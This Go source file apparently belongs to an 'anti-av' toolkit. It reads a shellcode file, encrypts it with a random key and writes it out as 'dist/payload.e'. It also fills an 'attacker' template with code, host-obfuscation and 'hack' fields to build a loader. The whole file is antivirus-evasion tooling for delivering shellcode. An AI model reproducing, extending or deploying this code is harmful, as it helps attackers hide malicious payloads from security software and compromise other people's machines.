package main

import (
	"html/template"
	"io/ioutil"
	"math/rand"
	"os"
	"path/filepath"

	"github.com/b1gcat/anti-av/utils"
	"github.com/sirupsen/logrus"
)

type Ref struct {
	CODE            string
	HOST_OBFUSCATOR string
	HACK            string
}

func (c *config) buildPayload() {
	if !c.crypt {
		return
	}
	defer os.Exit(0)
	logrus.Info("[*] encrypt Payload")
	sc, err := ioutil.ReadFile(c.shellcode)
	if err != nil {
		logrus.Error("[x] ", err.Error())
		return
	}
	key := make([]byte, 8)
	rand.Read(key)

	_, err = c.payloadEncrypt(key, sc, true)
	if err != nil {
		logrus.Error("[x] ", err.Error())
		return
	}
}

func (c *config) payloadEncrypt(key, sc []byte, out bool) ([]byte, error) {
	esc, err := utils.Crypt(key, sc)
	if err != nil {
		return nil, err
	}
	if out {
		if err := ioutil.WriteFile(filepath.Join("dist", "payload.e"), esc, 0755); err != nil {
			return nil, err
		}
		logrus.Info("[*] encrypted Payload:", filepath.Join("dist", "payload.e"))
	}
	return esc, nil
}

func (c *config) payloadPatch(ref *Ref, file string) error {
	sc, err := ioutil.ReadFile(file)
	if err != nil {
		return err
	}
	tmpl, err := template.New("attacker").Funcs(template.FuncMap{
		"lt": func(s string) string {
			return s
		},
	}).Parse(string(sc))
	if err != nil {
		return err
	}

	wr, err := os.OpenFile(file, os.O_RDWR|os.O_TRUNC|os.O_CREATE, 0755)
	if err != nil {
		return err
	}
	defer wr.Close()

	if err := tmpl.Execute(wr, ref); err != nil {
		return err
	}

	return nil
}
